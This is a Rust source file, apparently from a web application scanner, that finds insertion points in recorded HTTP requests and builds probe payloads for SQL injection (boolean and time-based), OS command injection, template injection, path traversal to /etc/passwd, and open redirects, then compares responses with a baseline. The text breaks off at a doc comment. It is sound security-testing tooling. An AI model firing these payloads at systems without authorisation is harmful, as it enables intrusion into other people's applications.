//! Active checks: build probe requests from a recorded one, then compare
//! each probe's response with the baseline. No I/O here: the service layer
//! sends the probes through the policy gate.
//!
//! Insertion points are query parameters, form fields, JSON string and
//! number values, numeric path segments, other path segments the caller
//! knows are identifiers (from the app model, e.g. `/users/{username}`),
//! cookies, and the User-Agent, Referer and X-Forwarded-For headers.
//!
//! One-shot checks (a probe, then [`analyze`]):
//!
//! | check | payloads | flagged when |
//! |---|---|---|
//! | `sql_error` | `'`, `"`, `')`, `\` | a database error appears that the baseline didn't show |
//! | `cmd_injection` | `;echo M$((7*191))` and other separators | `M1337` comes back (the shell did the sum) |
//! | `reflected_input` | a unique marker with `<"'>` | the marker comes back with `<` and `"` unencoded in HTML |
//! | `open_redirect` | `https://pm-redirect.example/` (redirect-like parameters) | a 3xx points at that host |
//! | `path_traversal` | `../` sequences to `/etc/passwd` and `win.ini` (file-like parameters) | the file's content comes back |
//! | `ssti` | `{{7*191}}`, `${7*191}`, `#{…}`, `*{…}`, `@(…)`, `<%= … %>`… | `1337` appears and wasn't in the baseline |
//!
//! Multi-step checks (the caller sends, these functions judge):
//!
//! | check | how | confirmed when |
//! |---|---|---|
//! | `sql_boolean` | [`sql_bool_pairs`]: a true and a false condition | true looks like the baseline, false doesn't, twice, and a second formulation agrees |
//! | `sql_time` | [`sql_time_probes`]: sleep N in MySQL, PostgreSQL, SQL Server, Oracle syntax | N seconds slower, sleep 0 is fast, and a longer sleep is longer ([`delayed`]) |
//! | `cmd_time` | [`cmd_time_probes`]: `;sleep N`, `$(sleep N)`, `ping -n`… | the same three timings |
//!
//! Every issue is a lead to prove, not a finding.

use serde::Serialize;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum PointKind {
    Query,
    Form,
    Json,
    Path,
    Cookie,
    Header,
    /// The whole body (e.g. an XML document for XXE).
    Body,
    /// The request as a whole (Host, Origin, path tricks).
    Request,
    /// A query or form parameter's name.
    Name,
    /// A value inside another one: JSON in a parameter or cookie, or base64.
    Nested,
    /// Text of an element in an XML body.
    Xml,
}

/// Where a payload can go.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct Point {
    pub kind: PointKind,
    pub name: String,
    pub original: String,
    /// Index of the query pair / form pair / path segment, or the JSON pointer.
    #[serde(skip)]
    locator: Locator,
}

#[derive(Debug, Clone, PartialEq, Eq, Default)]
enum Locator {
    #[default]
    None,
    Pair(usize),
    Segment(usize),
    Pointer(String),
    Cookie(usize),
    /// Lower-case header name.
    Header(String),
    /// Name of the query (`Query`) or form (`Form`) pair at this index.
    Name(PointKind, usize),
    Nested(Box<Nest>),
    /// Byte range of the text in the body.
    Xml(usize, usize),
}

/// Where a nested value sits: the outer point, how it is encoded, and the
/// JSON pointer inside it (none: the whole decoded value).
#[derive(Debug, Clone, PartialEq, Eq)]
struct Nest {
    outer_kind: PointKind,
    outer: Locator,
    b64: Option<B64>,
    ptr: Option<String>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
struct B64 {
    url_safe: bool,
    padded: bool,
}

const B64_STD: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

fn b64_encode(data: &[u8], k: B64) -> String {
    let mut out = String::new();
    for chunk in data.chunks(3) {
        let n = chunk.iter().enumerate().fold(0u32, |n, (i, b)| n | (u32::from(*b) << (16 - 8 * i)));
        for i in 0..=chunk.len() {
            let c = B64_STD[((n >> (18 - 6 * i)) & 63) as usize];
            out.push(match (k.url_safe, c) {
                (true, b'+') => '-',
                (true, b'/') => '_',
                (_, c) => c as char,
            });
        }
        if k.padded {
            out.push_str(&"=".repeat(3 - chunk.len()));
        }
    }
    out
}

/// A value that looks like base64 of readable text: the text and the flavour.
fn b64_text(v: &str) -> Option<(String, B64)> {
    if v.len() < 8 || v.len() > 4096 {
        return None;
    }
    let url_safe = v.contains(['-', '_']);
    let body = v.trim_end_matches('=');
    let mut bits = 0u32;
    let mut nbits = 0;
    let mut out = Vec::new();
    for c in body.bytes() {
        let x = match c {
            b'A'..=b'Z' => c - b'A',
            b'a'..=b'z' => c - b'a' + 26,
            b'0'..=b'9' => c - b'0' + 52,
            b'+' if !url_safe => 62,
            b'/' if !url_safe => 63,
            b'-' if url_safe => 62,
            b'_' if url_safe => 63,
            _ => return None,
        };
        bits = (bits << 6) | u32::from(x);
        nbits += 6;
        if nbits >= 8 {
            nbits -= 8;
            out.push((bits >> nbits) as u8);
            bits &= (1 << nbits) - 1;
        }
    }
    let text = String::from_utf8(out).ok()?;
    let readable = !text.is_empty() && text.chars().all(|c| !c.is_control() || c.is_whitespace());
    // A plain word made of base64 letters decodes to junk; real data round-trips.
    let k = B64 { url_safe, padded: v.ends_with('=') };
    (readable && b64_encode(text.as_bytes(), k).trim_end_matches('=') == body).then_some((text, k))
}

pub const CHECKS: &[&str] = &[
    "sql_error",
    "cmd_injection",
    "reflected_input",
    "open_redirect",
    "path_traversal",
    "ssti",
    "crlf",
    "host_header",
    "cors",
    "sql_boolean",
    "sql_time",
    "cmd_time",
    "nosql_operator",
    "auth_bypass",
    "hidden_params",
    "stored_xss",
    "dom_xss",
    "csrf",
    "jwt",
    "graphql",
    "cache_poisoning",
    "cache_deception",
    "mass_assignment",
    "proto_pollution",
];

/// Checks that take several rounds (run after the one-shot ones).
pub const MULTI_STEP: &[&str] = &[
    "sql_boolean",
    "sql_time",
    "cmd_time",
    "nosql_operator",
    "auth_bypass",
    "hidden_params",
    "stored_xss",
    "dom_xss",
    "csrf",
    "jwt",
    "graphql",
    "cache_poisoning",
    "cache_deception",
    "mass_assignment",
    "proto_pollution",
];

/// Headers that apps often pass to SQL (logging, analytics) or shells.
const HEADERS: &[&str] = &["user-agent", "referer", "x-forwarded-for"];

/// One request to send.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct Probe {
    pub check: &'static str,
    pub point: Point,
    pub payload: String,
    #[serde(skip)]
    pub raw: Vec<u8>,
}

/// What came back for a request.
#[derive(Debug, Clone, Default)]
pub struct Seen {
    pub status: Option<u16>,
    pub location: Option<String>,
    pub content_type: Option<String>,
    /// Decoded body.
    pub body: String,
    /// Response headers, names lower-cased.
    pub headers: Vec<(String, String)>,
}

impl Seen {
    pub fn header(&self, name: &str) -> Option<&str> {
        self.headers.iter().find(|(n, _)| n == name).map(|(_, v)| v.as_str())
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct ActiveIssue {
    pub check: &'static str,
    pub title: &'static str,
    /// info, low, medium or high
    pub severity: &'static str,
    pub point: String,
    pub payload: String,
    /// What was seen (from the target: untrusted).
    pub evidence: String,
    /// How to prove it with proof_run, when an oracle fits.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub prove_with: Option<String>,
}

pub(crate) fn percent_encode(s: &str) -> String {
    let mut out = String::with_capacity(s.len() * 3);
    for b in s.bytes() {
        if b.is_ascii_alphanumeric() || matches!(b, b'-' | b'_' | b'.' | b'~') {
            out.push(b as char);
        } else {
            out.push_str(&format!("%{b:02X}"));
        }
    }
    out
}

/// Percent-encodes only what a cookie value can't hold (separators,
/// quotes, spaces, controls, non-ASCII): servers rarely decode cookies, so
/// `'`, `=` and base64 go as they are.
fn cookie_encode(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    for b in s.bytes() {
        if b.is_ascii_graphic() && !matches!(b, b';' | b',' | b'"' | b'\\' | b'%') {
            out.push(b as char);
        } else {
            out.push_str(&format!("%{b:02X}"));
        }
    }
    out
}

fn percent_decode(s: &str) -> String {
    let b = s.as_bytes();
    let mut out = Vec::with_capacity(b.len());
    let mut i = 0;
    while i < b.len() {
        let hex = |c: u8| (c as char).to_digit(16);
        match (b[i], b.get(i + 1).copied().and_then(hex), b.get(i + 2).copied().and_then(hex)) {
            (b'%', Some(h), Some(l)) => {
                out.push((h * 16 + l) as u8);
                i += 3;
            }
            (b'+', ..) => {
                out.push(b' ');
                i += 1;
            }
            (c, ..) => {
                out.push(c);
                i += 1;
            }
        }
    }
    String::from_utf8_lossy(&out).into_owned()
}

#[derive(Clone, Copy)]
pub(crate) struct Parsed<'a> {
    pub(crate) method: &'a str,
    pub(crate) target: &'a str,
    pub(crate) version: &'a str,
    pub(crate) rest_of_head: &'a str,
    pub(crate) body: &'a str,
    pub(crate) form: bool,
    pub(crate) json: bool,
    pub(crate) xml: bool,
}

pub(crate) fn parse(raw: &str) -> Option<Parsed<'_>> {
    let (head, body) = raw.split_once("\r\n\r\n").or_else(|| raw.split_once("\n\n"))?;
    let (line, rest_of_head) = head.split_once('\n').unwrap_or((head, ""));
    let line = line.trim_end_matches('\r');
    let (method, rest) = line.split_once(' ')?;
    let (target, version) = rest.rsplit_once(' ')?;
    let ct = rest_of_head
        .lines()
        .find_map(|l| l.split_once(':').filter(|(k, _)| k.trim().eq_ignore_ascii_case("content-type")).map(|(_, v)| v))
        .unwrap_or("")
        .to_ascii_lowercase();
    Some(Parsed {
        method,
        target,
        version,
        rest_of_head,
        body,
        form: ct.contains("application/x-www-form-urlencoded"),
        json: ct.contains("json"),
        xml: ct.contains("xml"),
    })
}

pub(crate) fn rebuild(p: &Parsed, target: &str, body: &str) -> Vec<u8> {
    let sep = if p.rest_of_head.is_empty() { "" } else { "\r\n" };
    format!("{} {target} {}{sep}{}\r\n\r\n{body}", p.method, p.version, p.rest_of_head.trim_end_matches(['\r', '\n']))
        .replace("\r\r\n", "\r\n")
        .into_bytes()
}

fn pairs(s: &str) -> Vec<(String, String)> {
    s.split('&')
        .filter(|p| !p.is_empty())
        .map(|p| {
            let (k, v) = p.split_once('=').unwrap_or((p, ""));
            (k.to_string(), v.to_string())
        })
        .collect()
}

fn join(ps: &[(String, String)]) -> String {
    ps.iter().map(|(k, v)| format!("{k}={v}")).collect::<Vec<_>>().join("&")
}

fn json_leaves(v: &serde_json::Value, ptr: String, out: &mut Vec<(String, String)>) {
    match v {
        serde_json::Value::String(s) => out.push((ptr, s.clone())),
        serde_json::Value::Number(n) => out.push((ptr, n.to_string())),
        serde_json::Value::Object(o) => {
            for (k, x) in o {
                json_leaves(x, format!("{ptr}/{}", k.replace('~', "~0").replace('/', "~1")), out);
            }
        }
        serde_json::Value::Array(a) => {
            for (i, x) in a.iter().enumerate().take(5) {
                json_leaves(x, format!("{ptr}/{i}"), out);
            }
        }
        _ => {}
    }
}

impl Point {
    /// The request body as one insertion point.
    pub fn body() -> Self {
        Self { kind: PointKind::Body, name: "body".into(), original: String::new(), locator: Locator::None }
    }

    /// The request as a whole, e.g. `Host header` or `Origin header`.
    pub fn request(name: &str) -> Self {
        Self { kind: PointKind::Request, name: name.into(), original: String::new(), locator: Locator::None }
    }
}

/// Head and body of a raw request (`\r\n\r\n` or `\n\n`), for whole-body payloads.
pub fn split_body(raw: &str) -> Option<(&str, &str)> {
    raw.split_once("\r\n\r\n").or_else(|| raw.split_once("\n\n"))
}

/// Places where payloads can go in `raw`.
pub fn points(raw: &str) -> Vec<Point> {
    points_with(raw, &[])
}

/// Like [`points`], plus the path segments at `id_segments` (indices in
/// `path.split('/')`), for identifiers that aren't numbers.
pub fn points_with(raw: &str, id_segments: &[usize]) -> Vec<Point> {
    let Some(p) = parse(raw) else { return Vec::new() };
    let mut out = Vec::new();
    let (path, query) = p.target.split_once('?').unwrap_or((p.target, ""));
    for (i, (k, v)) in pairs(query).into_iter().enumerate() {
        out.push(Point {
            kind: PointKind::Query,
            name: percent_decode(&k),
            original: percent_decode(&v),
            locator: Locator::Pair(i),
        });
    }
    for (i, seg) in path.split('/').enumerate() {
        let numeric = seg.len() <= 20 && seg.chars().all(|c| c.is_ascii_digit());
        if !seg.is_empty() && (numeric || (id_segments.contains(&i) && seg.len() <= 200)) {
            out.push(Point {
                kind: PointKind::Path,
                name: format!("path segment {i}"),
                original: seg.to_string(),
                locator: Locator::Segment(i),
            });
        }
    }
    if p.form {
        for (i, (k, v)) in pairs(p.body.trim()).into_iter().enumerate() {
            out.push(Point {
                kind: PointKind::Form,
                name: percent_decode(&k),
                original: percent_decode(&v),
                locator: Locator::Pair(i),
            });
        }
    } else if p.json
        && let Ok(v) = serde_json::from_str::<serde_json::Value>(p.body)
    {
        let mut leaves = Vec::new();
        json_leaves(&v, String::new(), &mut leaves);
        for (ptr, val) in leaves.into_iter().take(30) {
            let name = ptr.rsplit('/').next().unwrap_or("").to_string();
            out.push(Point { kind: PointKind::Json, name, original: val, locator: Locator::Pointer(ptr) });
        }
    }
    for line in p.rest_of_head.lines() {
        let Some((k, v)) = line.split_once(':') else { continue };
        let (k, v) = (k.trim().to_ascii_lowercase(), v.trim());
        if k == "cookie" {
            for (i, c) in v.split(';').map(str::trim).filter(|c| !c.is_empty()).take(20).enumerate() {
                let (name, value) = c.split_once('=').unwrap_or((c, ""));
                out.push(Point {
                    kind: PointKind::Cookie,
                    name: name.to_string(),
                    original: percent_decode(value),
                    locator: Locator::Cookie(i),
                });
            }
        } else if HEADERS.contains(&k.as_str()) {
            out.push(Point {
                kind: PointKind::Header,
                name: k.clone(),
                original: v.to_string(),
                locator: Locator::Header(k),
            });
        }
    }
    if p.xml {
        out.extend(xml_points(p.body));
    }
    let nested: Vec<Point> = out
        .iter()
        .filter(|pt| matches!(pt.kind, PointKind::Query | PointKind::Form | PointKind::Cookie))
        .flat_map(nested_points)
        .take(20)
        .collect();
    out.extend(nested);
    out
}

/// JSON (objects and arrays) or base64 text inside a parameter or cookie value.
fn nested_points(pt: &Point) -> Vec<Point> {
    let (text, b64) = match b64_text(&pt.original) {
        Some((t, k)) => (t, Some(k)),
        None => (pt.original.clone(), None),
    };
    let suffix = if b64.is_some() { " (base64)" } else { "" };
    let nest = |ptr: Option<String>| {
        Locator::Nested(Box::new(Nest { outer_kind: pt.kind, outer: pt.locator.clone(), b64, ptr }))
    };
    match serde_json::from_str::<serde_json::Value>(&text) {
        Ok(v) if v.is_object() || v.is_array() => {
            let mut leaves = Vec::new();
            json_leaves(&v, String::new(), &mut leaves);
            leaves
                .into_iter()
                .take(10)
                .map(|(ptr, val)| Point {
                    kind: PointKind::Nested,
                    name: format!("{}{}{suffix}", pt.name, ptr.replace('/', ".")),
                    original: val,
                    locator: nest(Some(ptr)),
                })
                .collect()
        }
        _ if b64.is_some() => {
            vec![Point {
                kind: PointKind::Nested,
                name: format!("{}{suffix}", pt.name),
                original: text,
                locator: nest(None),
            }]
        }
        _ => Vec::new(),
    }
}

/// Text between an element's tags in an XML body (not comments, CDATA or
/// declarations), at most 20.
fn xml_points(body: &str) -> Vec<Point> {
    let mut out = Vec::new();
    let mut tag = String::new();
    let mut i = 0;
    while let Some(lt) = body[i..].find('<').map(|x| x + i) {
        let Some(gt) = body[lt..].find('>').map(|x| x + lt) else { break };
        let inside = &body[lt + 1..gt];
        let closing = inside.starts_with('/');
        if !inside.starts_with(['!', '?']) && !closing {
            tag = inside.split(|c: char| c.is_whitespace() || c == '/').next().unwrap_or("").to_string();
        }
        let start = gt + 1;
        let end = body[start..].find('<').map_or(body.len(), |x| x + start);
        let text = &body[start..end];
        let self_closing = inside.ends_with('/');
        if !closing && !self_closing && !inside.starts_with(['!', '?']) && !text.trim().is_empty() && end < body.len() {
            out.push(Point {
                kind: PointKind::Xml,
                name: tag.clone(),
                original: text.to_string(),
                locator: Locator::Xml(start, end),
            });
            if out.len() >= 20 {
                break;
            }
        }
        i = end.max(gt + 1);
    }
    out
}

/// Query and form parameter names as insertion points (some apps put
/// names in SQL or echo them back).
pub fn name_points(raw: &str) -> Vec<Point> {
    let Some(p) = parse(raw) else { return Vec::new() };
    let query = p.target.split_once('?').map_or("", |(_, q)| q);
    let form = if p.form { pairs(p.body.trim()) } else { Vec::new() };
    let named = |kind: PointKind, ps: Vec<(String, String)>| {
        ps.into_iter().enumerate().map(move |(i, (k, _))| Point {
            kind: PointKind::Name,
            name: percent_decode(&k),
            original: percent_decode(&k),
            locator: Locator::Name(kind, i),
        })
    };
    named(PointKind::Query, pairs(query)).chain(named(PointKind::Form, form)).take(10).collect()
}

/// The head lines after the request line, with one header replaced.
fn replace_head_line(rest: &str, mut f: impl FnMut(&str, &str) -> Option<String>) -> String {
    rest.lines()
        .map(|l| {
            let l = l.trim_end_matches('\r');
            match l.split_once(':') {
                Some((k, v)) => f(&k.trim().to_ascii_lowercase(), v.trim())
                    .map_or_else(|| l.to_string(), |v| format!("{}: {v}", k.trim())),
                None => l.to_string(),
            }
        })
        .collect::<Vec<_>>()
        .join("\r\n")
}

/// `raw` with `value` in place of the point's original value.
pub fn inject(raw: &str, point: &Point, value: &str) -> Option<Vec<u8>> {
    let p = parse(raw)?;
    let (path, query) = p.target.split_once('?').unwrap_or((p.target, ""));
    match (&point.kind, &point.locator) {
        (PointKind::Query, Locator::Pair(i)) => {
            let mut ps = pairs(query);
            ps.get_mut(*i)?.1 = percent_encode(value);
            Some(rebuild(&p, &format!("{path}?{}", join(&ps)), p.body))
        }
        (PointKind::Path, Locator::Segment(i)) => {
            let mut segs: Vec<String> = path.split('/').map(str::to_string).collect();
            *segs.get_mut(*i)? = percent_encode(value);
            let q = if query.is_empty() { String::new() } else { format!("?{query}") };
            Some(rebuild(&p, &format!("{}{q}", segs.join("/")), p.body))
        }
        (PointKind::Form, Locator::Pair(i)) => {
            let mut ps = pairs(p.body.trim());
            ps.get_mut(*i)?.1 = percent_encode(value);
            Some(rebuild(&p, p.target, &join(&ps)))
        }
        (PointKind::Json, Locator::Pointer(ptr)) => {
            let mut v: serde_json::Value = serde_json::from_str(p.body).ok()?;
            *v.pointer_mut(ptr)? = serde_json::Value::String(value.to_string());
            Some(rebuild(&p, p.target, &v.to_string()))
        }
        (PointKind::Cookie, Locator::Cookie(i)) => {
            let rest = replace_head_line(p.rest_of_head, |k, v| {
                (k == "cookie").then(|| {
                    v.split(';')
                        .map(str::trim)
                        .filter(|c| !c.is_empty())
                        .enumerate()
                        .map(|(j, c)| match (j == *i, c.split_once('=')) {
                            (true, Some((n, _))) => format!("{n}={}", cookie_encode(value)),
                            (true, None) => format!("{c}={}", cookie_encode(value)),
                            _ => c.to_string(),
                        })
                        .collect::<Vec<_>>()
                        .join("; ")
                })
            });
            Some(rebuild(&Parsed { rest_of_head: &rest, ..p }, p.target, p.body))
        }
        (PointKind::Name, Locator::Name(kind, i)) => {
            let rename = |s: &str| {
                let mut ps = pairs(s);
                ps.get_mut(*i)?.0 = percent_encode(value);
                Some(join(&ps))
            };
            if *kind == PointKind::Query {
                Some(rebuild(&p, &format!("{path}?{}", rename(query)?), p.body))
            } else {
                Some(rebuild(&p, p.target, &rename(p.body.trim())?))
            }
        }
        (PointKind::Nested, Locator::Nested(n)) => {
            let outer = points(raw).into_iter().find(|o| o.kind == n.outer_kind && o.locator == n.outer)?;
            let inner = match n.b64 {
                Some(_) => b64_text(&outer.original)?.0,
                None => outer.original.clone(),
            };
            let new_inner = match &n.ptr {
                Some(ptr) => {
                    let mut v: serde_json::Value = serde_json::from_str(&inner).ok()?;
                    *v.pointer_mut(ptr)? = serde_json::Value::String(value.to_string());
                    v.to_string()
                }
                None => value.to_string(),
            };
            let new = match n.b64 {
                Some(k) => b64_encode(new_inner.as_bytes(), k),
                None => new_inner,
            };
            inject(raw, &outer, &new)
        }
        (PointKind::Xml, Locator::Xml(start, end)) => {
            let body = format!("{}{value}{}", p.body.get(..*start)?, p.body.get(*end..)?);
            Some(rebuild(&p, p.target, &body))
        }
        (PointKind::Header, Locator::Header(name)) => {
            // Header values can't hold line breaks; everything else goes as is.
            let clean: String = value.chars().filter(|c| *c != '\r' && *c != '\n').collect();
            let rest = replace_head_line(p.rest_of_head, |k, _| (k == name).then(|| clean.clone()));
            Some(rebuild(&Parsed { rest_of_head: &rest, ..p }, p.target, p.body))
        }
        _ => None,
    }
}

fn redirect_like(name: &str) -> bool {
    let n = name.to_ascii_lowercase();
    [
        "url",
        "uri",
        "next",
        "redirect",
        "return",
        "returnto",
        "return_to",
        "goto",
        "dest",
        "destination",
        "continue",
        "r",
        "target",
        "redir",
        "callback",
        "to",
    ]
    .iter()
    .any(|k| n == *k || n.ends_with(&format!("_{k}")) || n.starts_with(&format!("{k}_")))
}

fn file_like(p: &Point) -> bool {
    let n = p.name.to_ascii_lowercase();
    ["file", "path", "page", "template", "doc", "document", "folder", "dir", "name", "filename", "include", "view"]
        .iter()
        .any(|k| n.contains(k))
        || (p.original.contains('.') && !p.original.contains("://") && p.original.len() < 100)
}

pub const REDIRECT_TARGET: &str = "https://pm-redirect.example/";

/// Template expressions that make `1337`, and the engines that evaluate them.
const SSTI: &[(&str, &str)] = &[
    ("Jinja2, Twig, Nunjucks, Handlebars-like", "{{7*191}}"),
    ("FreeMarker, Velocity, JSP EL, Mako, Groovy, JS template literals", "${7*191}"),
    ("ERB, EJS, JSP", "<%= 7*191 %>"),
    ("Ruby (Slim, Haml), Java EL (JSF), Pug", "#{7*191}"),
    ("Thymeleaf (Spring)", "*{7*191}"),
    ("Razor (.NET)", "@(7*191)"),
    ("Smarty", "{7*191}"),
    ("Velocity", "#set($pm=7*191)$pm"),
];

/// Output-based command injection: the shell computes `$((7*191))`, so
/// `M1337` only comes back if a shell ran it (an echo of the input
/// contains the literal `$((7*191))`).
pub fn cmd_output_payloads(original: &str, marker: &str) -> Vec<String> {
    let cmd = format!("echo {marker}$((7*191))");
    vec![
        format!("{original};{cmd};"),
        format!("{original}|{cmd}"),
        format!("{original}$({cmd})"),
        format!("{original}`{cmd}`"),
        format!("{original}\n{cmd}\n"),
        format!("{original}&&{cmd}"),
        format!("{original}||{cmd}"),
    ]
}

/// A true and a false condition for boolean-based SQL injection.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct BoolPair {
    /// Quoting context, e.g. `string`, `string-comment`, `numeric`.
    pub context: &'static str,
    pub truthy: String,
    pub falsy: String,
    /// Another way to say the same, to confirm a hit.
    pub truthy2: String,
    pub falsy2: String,
}

/// Boolean pairs for a value, most likely contexts first. Numeric values
/// also get unquoted forms; comment forms cover values inside `LIKE '%…%'`
/// or followed by more SQL.
pub fn sql_bool_pairs(original: &str) -> Vec<BoolPair> {
    let o = original;
    let pair = |context, t: String, f: String, t2: String, f2: String| BoolPair {
        context,
        truthy: t,
        falsy: f,
        truthy2: t2,
        falsy2: f2,
    };
    let mut out = Vec::new();
    let numeric = !o.is_empty() && o.len() <= 20 && o.chars().all(|c| c.is_ascii_digit());
    if numeric {
        out.push(pair(
            "numeric",
            format!("{o} AND 1=1"),
            format!("{o} AND 1=2"),
            format!("{o} AND 3>2"),
            format!("{o} AND 2>3"),
        ));
    }
    out.push(pair(
        "string",
        format!("{o}' AND '1'='1"),
        format!("{o}' AND '1'='2"),
        format!("{o}' AND 'b'>'a"),
        format!("{o}' AND 'a'>'b"),
    ));
    out.push(pair(
        "string-comment",
        format!("{o}' AND 1=1-- -"),
        format!("{o}' AND 1=2-- -"),
        format!("{o}' AND 3>2-- -"),
        format!("{o}' AND 2>3-- -"),
    ));
    out.push(pair(
        "double-quoted",
        format!("{o}\" AND \"1\"=\"1"),
        format!("{o}\" AND \"1\"=\"2"),
        format!("{o}\" AND \"b\">\"a"),
        format!("{o}\" AND \"a\">\"b"),
    ));
    out
}

/// A delay payload: `slow(n)` sleeps n seconds; `slow(0)` is the control.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct TimeProbe {
    /// e.g. `MySQL`, `PostgreSQL (stacked)`, `sh`, `Windows cmd`
    pub family: &'static str,
    /// The payload with `{N}` where the seconds go.
    pub template: String,
}

impl TimeProbe {
    pub fn with_delay(&self, secs: u64) -> String {
        // `ping -n K` waits about K-1 seconds.
        self.template.replace("{N1}", &(secs + 1).to_string()).replace("{N}", &secs.to_string())
    }
}

/// Time-based SQL injection payloads.
pub fn sql_time_probes(original: &str) -> Vec<TimeProbe> {
    let o = original;
    let numeric = !o.is_empty() && o.len() <= 20 && o.chars().all(|c| c.is_ascii_digit());
    let t = |family, template: String| TimeProbe { family, template };
    let mut out = vec![
        t("MySQL", format!("{o}' AND SLEEP({{N}})-- -")),
        t("MySQL", format!("{o}' AND (SELECT 1 FROM (SELECT SLEEP({{N}}))pm)-- -")),
        t("MySQL", format!("{o}\" AND SLEEP({{N}})-- -")),
        t("PostgreSQL", format!("{o}' AND 1=(SELECT 1 FROM PG_SLEEP({{N}}))-- -")),
        t("PostgreSQL (stacked)", format!("{o}';SELECT PG_SLEEP({{N}})-- -")),
        t("SQL Server (stacked)", format!("{o}';WAITFOR DELAY '0:0:{{N}}'-- -")),
        t("Oracle", format!("{o}' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('pm',{{N}})-- -")),
        // Inside a string compared in WHERE: runs even when no row matches the value.
        t("MySQL/SQLite (concatenation)", format!("{o}'||SLEEP({{N}})||'")),
        t("PostgreSQL (concatenation)", format!("{o}'||(SELECT '' FROM PG_SLEEP({{N}}))||'")),
    ];
    if numeric {
        out.insert(0, t("MySQL", format!("{o} AND SLEEP({{N}})")));
        out.insert(1, t("PostgreSQL", format!("{o} AND 1=(SELECT 1 FROM PG_SLEEP({{N}}))")));
        out.insert(2, t("SQL Server (stacked)", format!("{o};WAITFOR DELAY '0:0:{{N}}'-- -")));
    }
    out
}

/// Time-based OS command injection payloads.
pub fn cmd_time_probes(original: &str) -> Vec<TimeProbe> {
    let o = original;
    let t = |family, template: String| TimeProbe { family, template };
    vec![
        t("sh", format!("{o};sleep {{N}};")),
        t("sh", format!("{o}|sleep {{N}}")),
        t("sh", format!("{o}$(sleep {{N}})")),
        t("sh", format!("{o}`sleep {{N}}`")),
        t("sh", format!("{o}\nsleep {{N}}\n")),
        t("sh", format!("{o}&&sleep {{N}}")),
        t("sh", format!("{o}||sleep {{N}}")),
        t("Windows cmd", format!("{o}&ping -n {{N1}} 127.0.0.1&")),
        t("Windows cmd", format!("{o}|ping -n {{N1}} 127.0.0.1")),
    ]
}

/// Similarity of two responses, 0 (nothing alike) to 1 (same words):
/// the overlap of their word multisets. Numbers count as one token kind
/// so counters and timestamps don't make identical pages look different.
pub fn similarity(a: &str, b: &str) -> f64 {
    fn tokens(s: &str) -> std::collections::HashMap<String, usize> {
        let mut m = std::collections::HashMap::new();
        for t in s.split(|c: char| !c.is_alphanumeric() && c != '_').filter(|t| !t.is_empty()) {
            let t = if t.chars().all(|c| c.is_ascii_digit()) { "#".to_string() } else { t.to_ascii_lowercase() };
            *m.entry(t).or_insert(0) += 1;
        }
        m
    }
    let (x, y) = (tokens(a), tokens(b));
    let (nx, ny): (usize, usize) = (x.values().sum(), y.values().sum());
    if nx + ny == 0 {
        return 1.0;
    }
    let common: usize = x.iter().map(|(k, n)| (*n).min(*y.get(k).unwrap_or(&0))).sum();
    2.0 * common as f64 / (nx + ny) as f64
}

/// How a response compares with the baseline, for boolean checks.
fn alike(base: &Seen, other: &Seen, noise: f64) -> bool {
    base.status == other.status && similarity(&base.body, &other.body) >= 1.0 - noise - 0.02
}

/// Boolean-based SQL injection: the true condition looks like the
/// baseline and the false one clearly doesn't. `base2` is a second send
/// of the original request: how much the page varies on its own.
pub fn bool_differs(base: &Seen, base2: &Seen, truthy: &Seen, falsy: &Seen) -> bool {
    let noise = 1.0 - similarity(&base.body, &base2.body);
    if noise > 0.2 || base.status != base2.status {
        return false; // the page changes too much by itself to tell
    }
    let far = |x: &Seen| x.status != base.status || similarity(&base.body, &x.body) < 1.0 - noise - 0.1;
    alike(base, truthy, noise)
        && far(falsy)
        && (truthy.status != falsy.status || similarity(&truthy.body, &falsy.body) < 0.9)
}

/// Whether `ms` is at least most of `secs` slower than the baseline
/// (`base_ms`: a few sends of the original request).
pub fn delayed(base_ms: &[u64], ms: u64, secs: u64) -> bool {
    let mut b = base_ms.to_vec();
    b.sort_unstable();
    let median = b.get(b.len() / 2).copied().unwrap_or(0);
    ms >= median + secs * 1000 * 8 / 10
}

/// Whether a delay check can work here: the baseline is quick and steady.
pub fn timing_usable(base_ms: &[u64]) -> bool {
    let max = base_ms.iter().copied().max().unwrap_or(u64::MAX);
    !base_ms.is_empty() && max < 3000
}

/// The issue for a confirmed multi-step check.
pub fn multi_step_issue(check: &str, point: &Point, payload: &str, evidence: String) -> ActiveIssue {
    let (check, title, prove_with): (&'static str, &'static str, Option<String>) = match check {
        "sql_boolean" => (
            "sql_boolean",
            "SQL injection (boolean-based blind)",
            Some("proof_run oracle timing with a delay payload in this parameter".into()),
        ),
        "sql_time" => (
            "sql_time",
            "SQL injection (time-based blind)",
            Some("proof_run oracle timing with this payload to measure it statistically".into()),
        ),
        "nosql_operator" => ("nosql_operator", "NoSQL injection: query operators in the input are run", None),
        "auth_bypass" => {
            ("auth_bypass", "Access control bypass: a denied page answers to a path or header trick", None)
        }
        "hidden_params" => ("hidden_params", "Hidden parameter accepted", None),
        "stored_xss" => ("stored_xss", "Stored input shown unencoded on another page (stored XSS)", None),
        "dom_xss" => ("dom_xss", "DOM-based XSS: a URL value reaches a dangerous sink in page scripts", None),
        "csrf" => ("csrf", "Cross-site request forgery: a state-changing request is accepted from another site", None),
        _ => (
            "cmd_time",
            "OS command injection (time-based blind)",
            Some("proof_run oracle timing with this payload to measure it statistically".into()),
        ),
    };
    ActiveIssue {
        check,
        title,
        severity: match check {
            "hidden_params" => "low",
            "csrf" => "medium",
            _ => "high",
        },
        point: format!("{:?} {}", point.kind, point.name).to_lowercase(),
        payload: payload.to_string(),
        evidence,
        prove_with,
    }
}

/// The probes for `checks` (all when empty), at most `limit`.
pub fn probes(raw: &str, checks: &[String], marker: &str, limit: usize) -> Vec<Probe> {
    probes_with(raw, checks, marker, limit, &[])
}

/// Like [`probes`], with extra identifier path segments (see [`points_with`]).
